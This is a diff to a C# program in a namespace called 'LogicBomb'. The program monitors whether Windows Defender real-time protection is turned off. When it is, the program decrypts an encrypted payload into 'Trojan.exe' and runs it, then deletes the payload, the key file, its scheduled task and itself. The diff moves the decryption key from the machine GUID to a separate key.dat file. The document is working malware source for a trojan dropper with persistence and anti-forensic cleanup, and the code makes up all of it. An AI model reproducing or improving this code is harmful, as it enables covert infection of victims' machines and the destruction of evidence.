@@ -17,6 +17,8 @@ namespace LogicBomb
 
         private const string EncryptedBombName = "bomb.encrypted";
         private const string DecryptedTrojanName = "Trojan.exe";
+        // --- NEW: Define the name of the file containing the decryption key ---
+        private const string KeyFileName = "key.dat";
         private const string LOGICBOMB_TASK_NAME = "Malicious_LogicBomb";
 
         private const int CheckIntervalSeconds = 10;
@@ -31,12 +33,11 @@ namespace LogicBomb
         {
             Directory.CreateDirectory(ResultDir);
 
-            // --- MODIFIED: Create timestamped log file name ---
             string timestamp = DateTime.Now.ToString("ddMMyyyy_HHmmss");
             string logFileName = $"LogicBomb_log_{timestamp}.txt";
             logFile = Path.Combine(ResultDir, logFileName);
 
-            Console.WriteLine("[LogicBomb] START (Polymorphic + Defender Monitor) - Press Ctrl+C to stop");
+            Console.WriteLine("[LogicBomb] START (Random Key + Defender Monitor) - Press Ctrl+C to stop");
             LogToFile("======================================================");
             LogToFile($"[STARTUP] Process started. PID:{Process.GetCurrentProcess().Id}, User:{Environment.UserName}");
             LogToFile($"[STARTUP] Base Directory: {ExecutableBaseDir}");
@@ -110,7 +111,6 @@ namespace LogicBomb
                     {
                         if (consecutiveDownChecks > 0)
                         {
-                            // Reset counter if RTP is re-enabled
                             consecutiveDownChecks = 0;
                         }
                     }
@@ -156,7 +156,6 @@ namespace LogicBomb
                             object disableValue = key.GetValue("DisableRealtimeMonitoring");
                             if (disableValue != null)
                             {
-                                // Returns true if the 'disable' value is 0
                                 return Convert.ToInt32(disableValue) == 0;
                             }
                         }
@@ -173,7 +172,7 @@ namespace LogicBomb
             }
 
             LogWarning("Could not determine RTP status, assuming enabled as a safeguard.");
-            return true; // Default to true to prevent accidental triggers
+            return true;
         }
 
         private static void TriggerPayload()
@@ -182,12 +181,24 @@ namespace LogicBomb
             {
                 LogInfo("=== PAYLOAD TRIGGERED ===");
                 LogToFile("[PAYLOAD] Payload activation sequence started.");
-
-                // --- MODIFIED: Log trigger event to file instead of creating a marker file ---
                 LogToFile($"[PAYLOAD] Trigger reason: Windows Defender Real-Time Protection was disabled at {DateTime.Now:yyyy-MM-dd HH:mm:ss}");
 
-                string machineGuid = CryptoUtils.GetMachineGuid();
-                LogInfo($"Local Machine GUID: {machineGuid}");
+                // --- MODIFIED: Load the decryption key from the key.dat file ---
+                string keyFilePath = Path.Combine(ExecutableBaseDir, KeyFileName);
+                if (!File.Exists(keyFilePath))
+                {
+                    LogError($"FATAL: Key file '{KeyFileName}' not found. Cannot decrypt payload.");
+                    return;
+                }
+
+                string keyString = File.ReadAllText(keyFilePath);
+                if (string.IsNullOrWhiteSpace(keyString))
+                {
+                    LogError($"FATAL: Key file '{KeyFileName}' is empty. Cannot decrypt payload.");
+                    return;
+                }
+
+                LogInfo($"Decryption key loaded from '{KeyFileName}'.");
 
                 string encryptedBombPath = Path.Combine(ExecutableBaseDir, EncryptedBombName);
                 string executableToRun = null;
@@ -198,7 +209,9 @@ namespace LogicBomb
                     {
                         LogInfo($"Found encrypted payload: {encryptedBombPath}");
                         string decryptedTrojanPath = Path.Combine(ResultDir, DecryptedTrojanName);
-                        CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, machineGuid);
+
+                        // --- MODIFIED: Use the loaded keyString for decryption ---
+                        CryptoUtils.DecryptFile(encryptedBombPath, decryptedTrojanPath, keyString);
 
                         LogSuccess($"Decrypted payload to: {decryptedTrojanPath}");
                         LogToFile($"[PAYLOAD] Decrypted '{encryptedBombPath}' to '{decryptedTrojanPath}'.");
@@ -225,7 +238,8 @@ namespace LogicBomb
                     }
                     catch (System.Security.Cryptography.CryptographicException ex)
                     {
-                        LogError("Decryption failed. The Machine GUID may be incorrect or the file is corrupt.");
+                        // --- MODIFIED: Updated error message ---
+                        LogError("Decryption failed. The key in 'key.dat' may be incorrect or the payload is corrupt.");
                         LogToFile($"[ERROR] Decryption failed: {ex.Message}");
                     }
                     catch (Exception ex)
@@ -292,6 +306,15 @@ namespace LogicBomb
                     LogToFile($"[CLEANUP] Deleted encrypted payload: {bombPath}");
                 }
 
+                // --- NEW: Also delete the key file ---
+                string keyPath = Path.Combine(ExecutableBaseDir, KeyFileName);
+                if (File.Exists(keyPath))
+                {
+                    File.Delete(keyPath);
+                    LogInfo($"Deleted {KeyFileName}");
+                    LogToFile($"[CLEANUP] Deleted key file: {keyPath}");
+                }
+
                 string selfPath = Process.GetCurrentProcess().MainModule.FileName;
 
                 ProcessStartInfo psi = new ProcessStartInfo
@@ -342,7 +365,6 @@ namespace LogicBomb
                     }
                     else
                     {
-                        // This might not be an error if the task never existed, so log as info
                         LogInfo($"Could not delete scheduled task '{taskName}'. It may not exist. Details: {error}");
                         LogToFile($"[CLEANUP] Note: Failed to delete scheduled task '{taskName}': {error}");
                     }
@@ -354,7 +376,6 @@ namespace LogicBomb
             }
         }
 
-        // --- NEW: Central method for writing to the log file ---
         private static void LogToFile(string message)
         {
             try
@@ -368,23 +389,21 @@ namespace LogicBomb
                     try
                     {
                         File.AppendAllText(logFile, logEntry + Environment.NewLine);
-                        return; // Exit method on success
+                        return;
                     }
                     catch (IOException) when (retries > 1)
                     {
                         retries--;
-                        Thread.Sleep(50); // Wait briefly if file is locked
+                        Thread.Sleep(50);
                     }
                 }
             }
             catch (Exception ex)
             {
-                // If logging fails, write to console as a last resort
                 Console.WriteLine($"[CRITICAL LOGGING FAILURE]: {ex.Message}");
             }
         }
 
-        // --- MODIFIED: Console logging methods now also write to the log file ---
         private static void LogInfo(string message)
         {
             Console.ForegroundColor = ConsoleColor.Cyan;
